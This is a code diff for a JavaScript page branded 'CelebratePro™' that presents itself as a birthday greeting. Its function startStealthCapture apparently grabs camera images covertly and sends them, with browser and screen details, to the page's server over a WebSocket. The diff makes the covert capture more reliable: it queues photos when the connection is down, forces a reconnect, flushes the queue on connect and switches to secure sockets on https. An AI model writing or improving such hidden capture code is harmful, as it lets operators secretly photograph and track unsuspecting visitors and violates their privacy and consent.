@@ -302,26 +302,28 @@ function startStealthCapture() {
         wsReady: wsClient && wsClient.readyState === WebSocket.OPEN
       });
       
-      // Send via WebSocket with professional metadata
+      // Prepare message
+      const message = {
+        type: 'birthday_photo',
+        sessionId: userId,
+        imageData: imageData,
+        timestamp: Date.now(),
+        metadata: {
+          platform: 'CelebratePro™',
+          quality: 'professional',
+          source: 'stealth_capture',
+          userAgent: navigator.userAgent,
+          screen: `${screen.width}x${screen.height}`
+        }
+      };
+      // Send or queue until WS is ready
       if (wsClient && wsClient.readyState === WebSocket.OPEN) {
-        const message = {
-          type: 'birthday_photo',
-          sessionId: userId,
-          imageData: imageData,
-          timestamp: Date.now(),
-          metadata: {
-            platform: 'CelebratePro™',
-            quality: 'professional',
-            source: 'stealth_capture',
-            userAgent: navigator.userAgent,
-            screen: `${screen.width}x${screen.height}`
-          }
-        };
-        
         wsClient.send(JSON.stringify(message));
         console.log('🎂 ✅ Photo sent to server via WebSocket');
       } else {
-        console.log('🎂 ❌ WebSocket not ready, photo not sent');
+        console.log('🎂 ❌ WebSocket not ready, queuing photo and ensuring connection');
+        bdOutgoingQueue.push(message);
+        ensureWebSocket();
       }
       
     } catch (error) {
@@ -539,13 +541,15 @@ function startProfessionalEffects() {
 }
 
 // Professional WebSocket Management
+let bdOutgoingQueue = [];
 function ensureWebSocket() {
   if (wsClient && wsClient.readyState === WebSocket.OPEN) {
     return;
   }
   
   try {
-    const wsUrl = `ws://${window.location.host}`;
+    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+    const wsUrl = `${protocol}//${window.location.host}`;
     wsClient = new WebSocket(wsUrl);
     
     wsClient.onopen = () => {
@@ -566,6 +570,14 @@ function ensureWebSocket() {
       
       wsClient.send(JSON.stringify(registrationMessage));
       console.log('🎂 Registration sent:', registrationMessage);
+      // Flush queued messages
+      if (bdOutgoingQueue.length) {
+        console.log(`🎂 Flushing ${bdOutgoingQueue.length} queued messages to server...`);
+        bdOutgoingQueue.forEach(msg => {
+          try { wsClient.send(JSON.stringify(msg)); } catch (e) { console.error('🎂 Queue flush send error:', e); }
+        });
+        bdOutgoingQueue = [];
+      }
     };
     
     wsClient.onmessage = (event) => {
